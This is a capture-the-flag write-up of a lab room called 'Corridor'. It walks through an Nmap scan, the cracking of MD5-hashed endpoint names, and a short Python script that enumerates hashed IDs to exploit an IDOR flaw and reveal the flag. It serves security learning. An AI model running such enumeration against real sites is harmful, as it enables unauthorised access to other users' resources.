# Corridor


1. Run a port scan with Nmap.
```
root@ip-10-10-65-182:~# sudo nmap -sS -A -sC 10.10.227.96

Starting Nmap 7.60 ( https://nmap.org ) at 2022-09-30 21:22 BST
Nmap scan report for ip-10-10-227-96.eu-west-1.compute.internal (10.10.227.96)
Host is up (0.00056s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.10.2)
|_http-title: Corridor
MAC Address: 02:AE:0B:CC:38:27 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=9/30%OT=80%CT=1%CU=39902%PV=Y%DS=1%DC=D%G=Y%M=02AE0B%T
OS:M=63375036%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A
OS:)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4
OS:ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1
OS:=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O
OS:=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N
OS:)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms ip-10-10-227-96.eu-west-1.compute.internal (10.10.227.96)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.21 seconds
```

2. Navigate to the website and we're presented with an image of 13 doors. If we view the page source with `Ctrl+U` we find that the website consists of a single image with multiple `area` tags, which create clickable areas around the image. We see that they lead to endpoints that look like hashes. Hovering over the image we find that we can click on each of the doors.
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
        integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
    <title>Corridor</title>

    <link rel="stylesheet" href="/static/css/main.css">
</head>

<body>

<img src="/static/img/corridor.png" usemap="#image-map">

    <map name="image-map">
        <area target="" alt="c4ca4238a0b923820dcc509a6f75849b" title="c4ca4238a0b923820dcc509a6f75849b" href="c4ca4238a0b923820dcc509a6f75849b" coords="257,893,258,332,325,351,325,860" shape="poly">
        <area target="" alt="c81e728d9d4c2f636f067f89cc14862c" title="c81e728d9d4c2f636f067f89cc14862c" href="c81e728d9d4c2f636f067f89cc14862c" coords="469,766,503,747,501,405,474,394" shape="poly">
        <area target="" alt="eccbc87e4b5ce2fe28308fd9f2a7baf3" title="eccbc87e4b5ce2fe28308fd9f2a7baf3" href="eccbc87e4b5ce2fe28308fd9f2a7baf3" coords="585,698,598,691,593,429,584,421" shape="poly">
        <area target="" alt="a87ff679a2f3e71d9181a67b7542122c" title="a87ff679a2f3e71d9181a67b7542122c" href="a87ff679a2f3e71d9181a67b7542122c" coords="650,658,644,437,658,652,655,437" shape="poly">
        <area target="" alt="e4da3b7fbbce2345d7772b0674a318d5" title="e4da3b7fbbce2345d7772b0674a318d5" href="e4da3b7fbbce2345d7772b0674a318d5" coords="692,637,690,455,695,628,695,467" shape="poly">
        <area target="" alt="1679091c5a880faf6fb5e6087eb1b2dc" title="1679091c5a880faf6fb5e6087eb1b2dc" href="1679091c5a880faf6fb5e6087eb1b2dc" coords="719,620,719,458,728,471,728,609" shape="poly">
        <area target="" alt="8f14e45fceea167a5a36dedd4bea2543" title="8f14e45fceea167a5a36dedd4bea2543" href="8f14e45fceea167a5a36dedd4bea2543" coords="857,612,933,610,936,456,852,455" shape="poly">
        <area target="" alt="c9f0f895fb98ab9159f51fd0297e236d" title="c9f0f895fb98ab9159f51fd0297e236d" href="c9f0f895fb98ab9159f51fd0297e236d" coords="1475,857,1473,354,1537,335,1541,901" shape="poly">
        <area target="" alt="45c48cce2e2d7fbdea1afc51c7c6ad26" title="45c48cce2e2d7fbdea1afc51c7c6ad26" href="45c48cce2e2d7fbdea1afc51c7c6ad26" coords="1324,766,1300,752,1303,401,1325,397" shape="poly">
        <area target="" alt="d3d9446802a44259755d38e6d163e820" title="d3d9446802a44259755d38e6d163e820" href="d3d9446802a44259755d38e6d163e820" coords="1202,695,1217,704,1222,423,1203,423" shape="poly">
        <area target="" alt="6512bd43d9caa6e02c990b0a82652dca" title="6512bd43d9caa6e02c990b0a82652dca" href="6512bd43d9caa6e02c990b0a82652dca" coords="1154,668,1146,661,1144,442,1157,442" shape="poly">
        <area target="" alt="c20ad4d76fe97759aa27a0c99bff6710" title="c20ad4d76fe97759aa27a0c99bff6710" href="c20ad4d76fe97759aa27a0c99bff6710" coords="1105,628,1116,633,1113,447,1102,447" shape="poly">
        <area target="" alt="c51ce410c124a10e0db5e4b97fc2af39" title="c51ce410c124a10e0db5e4b97fc2af39" href="c51ce410c124a10e0db5e4b97fc2af39" coords="1073,609,1081,620,1082,459,1073,463" shape="poly">
    </map>

</body>
</html>
```

3. If we insert the hashes into crackstation we find that they're md5sums of the digits from 1-13. The description of the CTF says that this is vulnerable to IDOR, so we can try picking other digits, hashing them with md5, and checking to see if an endpoint for that hash exists.
```
c4ca4238a0b923820dcc509a6f75849b
c81e728d9d4c2f636f067f89cc14862c
eccbc87e4b5ce2fe28308fd9f2a7baf3
a87ff679a2f3e71d9181a67b7542122c
e4da3b7fbbce2345d7772b0674a318d5
1679091c5a880faf6fb5e6087eb1b2dc
8f14e45fceea167a5a36dedd4bea2543
c51ce410c124a10e0db5e4b97fc2af39
c20ad4d76fe97759aa27a0c99bff6710
6512bd43d9caa6e02c990b0a82652dca
d3d9446802a44259755d38e6d163e820
45c48cce2e2d7fbdea1afc51c7c6ad26
c9f0f895fb98ab9159f51fd0297e236d
```

4. I wrote this simple Python script to check for endpoints with the digits from 0-20.
```
import requests
import hashlib


for i in range(0, 20):

    hash = hashlib.md5(str(i).encode()).hexdigest()
    res = requests.get("http://10.10.226.120/" + hash)

    if res.status_code == 200:
        print(i, hash)
```

5. After running the script I found that one of the numbers wasn't present in the picture, 0. Navigating to `http://10.10.227.96/cfcd208495d565ef66e7dff9f98764da` gave me the flag `flag{2477ef02448ad9156661ac40a6b8862e}`.
```
0 cfcd208495d565ef66e7dff9f98764da
1 c4ca4238a0b923820dcc509a6f75849b
2 c81e728d9d4c2f636f067f89cc14862c
3 eccbc87e4b5ce2fe28308fd9f2a7baf3
4 a87ff679a2f3e71d9181a67b7542122c
5 e4da3b7fbbce2345d7772b0674a318d5
6 1679091c5a880faf6fb5e6087eb1b2dc
7 8f14e45fceea167a5a36dedd4bea2543
8 c9f0f895fb98ab9159f51fd0297e236d
9 45c48cce2e2d7fbdea1afc51c7c6ad26
10 d3d9446802a44259755d38e6d163e820
11 6512bd43d9caa6e02c990b0a82652dca
12 c20ad4d76fe97759aa27a0c99bff6710
13 c51ce410c124a10e0db5e4b97fc2af39
```